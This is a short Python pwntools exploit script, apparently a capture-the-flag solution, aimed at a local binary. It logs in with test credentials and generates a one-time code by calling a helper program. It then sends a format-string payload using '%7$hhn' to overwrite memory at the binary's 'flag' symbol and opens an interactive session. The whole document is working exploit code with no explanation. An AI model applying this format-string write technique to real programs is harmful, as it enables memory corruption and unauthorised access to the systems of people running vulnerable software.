from pwn import *
import subprocess

e = ELF('./binary')
p = process('./binary')

def getOTP():
	t = subprocess.check_output(["./ctime"])
	return int(t)

flag_addr = e.symbols['flag']
print "flag: " + hex(flag_addr)

print p.recvuntil('Login: ')
p.sendline('test_account')
print p.recvuntil('Password: ')
p.sendline('test_password')
print p.recvuntil('code: ')
otp = getOTP()
p.sendline(str(otp))

print p.recvuntil('> ')
p.sendline('2')
print p.recvuntil('station > ')
tmp = len('Set station >')
print "tmp: " + str(tmp)
payload = p32(flag_addr)
payload += '%{}c%7$hhn'.format(0x11-tmp)

p.sendline(payload)
print p.recvuntil('> ')
p.sendline('1')
p.interactive()
